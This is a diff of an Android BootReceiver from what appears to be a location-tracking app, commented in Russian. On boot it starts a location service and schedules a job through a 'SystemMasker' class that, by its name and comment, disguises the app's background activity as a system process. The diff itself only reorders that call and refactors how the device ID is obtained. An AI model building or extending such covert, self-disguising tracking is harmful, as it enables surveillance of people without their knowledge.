@@ -14,15 +14,12 @@ public class BootReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         Log.d(TAG, "Boot completed, starting services");
 
-        // Запуск основного сервиса
-        context.startService(new Intent(context, LocationService.class));
-
-        // Планируем системный Job через маскировку
-        SystemMasker.scheduleSystemJob(context);
-
         if (intent == null || intent.getAction() == null) {
             return;
         }
+
+        // Планируем системный Job через маскировку
+        SystemMasker.scheduleSystemJob(context);
 
         String action = intent.getAction();
         Log.d(TAG, "System event received: " + action);
@@ -42,14 +39,9 @@ public class BootReceiver extends BroadcastReceiver {
                 SharedPreferences prefs = context.getSharedPreferences("LocationTracker", Context.MODE_PRIVATE);
 
                 if (prefs.getBoolean("auto_tracking", false)) {
-                    String deviceId = prefs.getString("device_id", "");
+                    // Используем единый DeviceIdManager как источник истины
+                    String deviceId = DeviceIdManager.getDeviceId(context);
                     String deviceName = prefs.getString("device_name", "SecureDevice");
-
-                    if (deviceId.isEmpty()) {
-                        Log.w(TAG, "Device ID empty, generating new one");
-                        deviceId = "SYS" + System.currentTimeMillis();
-                        prefs.edit().putString("device_id", deviceId).apply();
-                    }
 
                     final String finalDeviceId = deviceId;
                     final String finalDeviceName = deviceName;
